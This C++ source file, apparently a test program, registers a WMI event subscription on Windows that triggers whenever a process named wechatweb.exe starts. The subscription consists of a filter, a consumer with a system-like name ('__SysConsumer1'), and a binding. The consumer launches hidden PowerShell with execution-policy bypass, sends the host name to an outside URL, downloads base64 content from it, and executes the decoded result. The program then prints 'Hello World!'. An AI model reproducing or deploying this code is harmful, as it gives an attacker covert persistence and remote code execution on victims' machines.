// sc_test.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <wbemcli.h>
#include <comutil.h>
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")
using namespace std;



BOOL putStringInClass(IWbemClassObject* obj, BSTR key, BSTR val, tag_CIMTYPE_ENUMERATION type) {
    VARIANT v;
    HRESULT hr;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = val;
    hr = obj->Put(key, 0, &v, type);
    if (FAILED(hr))
        return FALSE;
    return TRUE;
}
int main()
{
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* enumerator = NULL;
    IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
    IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;
    WCHAR* cmd = (WCHAR*)L"powershell -w hidden -ep bypass -nop -c \"$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://cssxn.github.io/test.txt')))))\"";

    do
    {
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres))
        {
           break;
        }

        //init COM security context
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            break;
        }

        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres))
        {
            break;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres))
        {
            break;
        }
        hres = CoSetProxyBlanket(
            pSvc,                         // the proxy to set
            RPC_C_AUTHN_WINNT,            // authentication service
            RPC_C_AUTHZ_NONE,             // authorization service
            NULL,                         // Server principal name
            RPC_C_AUTHN_LEVEL_CALL,       // authentication level
            RPC_C_IMP_LEVEL_IMPERSONATE,  // impersonation level
            NULL,                         // client identity 
            EOAC_NONE                     // proxy capabilities     
        );
        if (FAILED(hres))
        {
            break;
        }

        //get class instances
        hres = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &eventConsumer, NULL);
        if (FAILED(hres))
        {
            break;
        }
        hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &eventFilter, NULL);
        if (FAILED(hres))
        {
            break;
        }
        hres = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &f2cBinding, NULL);
        if (FAILED(hres))
        {
            break;
        }

        //spawn __EventFilter class instance
        hres = eventFilter->SpawnInstance(0, &ef);
        if (FAILED(hres))
        {
            break;
        }
        putStringInClass(ef, bstr_t(L"EventNameSpace"), bstr_t(L"root\\cimv2"), CIM_STRING);
        putStringInClass(ef, bstr_t(L"Query"), bstr_t("select * from __InstanceCreationEvent within 5 where targetinstance isa \"win32_process\" and targetinstance.name=\"wechatweb.exe\" "), CIM_STRING);
        putStringInClass(ef, bstr_t(L"QueryLanguage"), bstr_t(L"WQL"), CIM_STRING);
        putStringInClass(ef, bstr_t(L"Name"), bstr_t(L"Filter1"), CIM_STRING);
        hres = pSvc->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres)) {
            break;
        }

        //spawn CommandLineEventConsumer class instance
        hres = eventConsumer->SpawnInstance(0, &ec);
        if (FAILED(hres)) {
            break;
        }
        putStringInClass(ec, _bstr_t(L"Name"), _bstr_t(L"__SysConsumer1"), CIM_STRING);
        putStringInClass(ec, _bstr_t(L"CommandLineTemplate"), bstr_t(cmd), CIM_STRING);
        hres = pSvc->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres)) 
        {
            break;
        }

        // spawn __FilterToConsumerBinding class instance
        hres = f2cBinding->SpawnInstance(0, &e2c);
        if (FAILED(hres)) 
        {
            break;
        }
        putStringInClass(e2c, bstr_t(L"Consumer"), bstr_t(L"CommandLineEventConsumer.Name=\"__SysConsumer1\""), CIM_REFERENCE);
        putStringInClass(e2c, bstr_t(L"Filter"),bstr_t(L"__EventFilter.Name=\"Filter1\""), CIM_REFERENCE);
        hres = pSvc->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hres)) 
        {
            break;
        }
     
    } while (false);

   

    // Cleanup
    // ========
    if (f2cBinding)
    {
        f2cBinding->Release();
    }
    if (eventFilter)
    {
        eventFilter->Release();
    }
    if (eventConsumer)
    {
        eventConsumer->Release();
    }
    if(pSvc)
    {
        pSvc->Release();
    }
    if (pLoc)
    {
        pLoc->Release();
    }
    CoUninitialize();
    
    std::cout << "Hello World!\n";
}

